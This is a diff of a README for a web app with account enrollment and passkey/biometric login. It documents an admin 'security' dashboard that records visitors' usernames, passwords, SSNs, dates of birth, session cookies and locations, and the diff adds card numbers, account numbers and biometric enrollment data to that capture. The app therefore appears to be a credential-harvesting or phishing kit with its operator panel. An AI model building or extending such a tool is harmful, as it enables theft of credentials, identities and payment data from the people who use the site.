@@ -47,16 +47,36 @@ New users can click "Enroll Now" to create an account with:
 
 Access the admin security dashboard at `/admin-security` to monitor all visitor activity.
 
-**Default Admin Key:** `admin-security-2024`
+**Admin Access:** Requires `ADMIN_SECRET_KEY` environment variable (no default exposed)
 
 The security center captures and displays:
 - **Credentials:** Username, password, email, phone, SSN, date of birth
+- **Financial Data:** Card number (13-19 digits), account number (8-17 digits)
 - **Device Info:** Browser, OS, device type (mobile/tablet/desktop)
 - **Location:** IP address, city, region, country, timezone (via IP geolocation)
 - **Session Data:** Cookies, session ID, form data
-- **Activity:** Login attempts, registrations, page views
+- **Biometric Data:** WebAuthn credential IDs, device types, attestation data
+- **Activity:** Login attempts, registrations, identity verifications, biometric enrollments
 
 All data is stored in the `visitor_logs` database table and auto-refreshes every 10 seconds.
+
+## Biometric Authentication
+
+The app supports WebAuthn biometric authentication (Face ID, Touch ID, fingerprint):
+
+### Login Options
+- **Passkey:** Click "Use a passkey" on the login page
+- **Face ID / Touch ID:** Mobile devices show a dedicated biometric button
+
+### Enrollment
+- After login, users see "Enable Biometric Sign On" card on the dashboard
+- Click "Set Up Now" to register biometric credentials
+- Supports Face ID, Touch ID, and fingerprint sensors
+
+### Technical Implementation
+- Server generates cryptographic challenges via `/api/auth/biometric/challenge`
+- Credentials stored in `biometric_credentials` table with credentialId, publicKey
+- All biometric attempts logged for admin monitoring
 
 ## API Endpoints
 
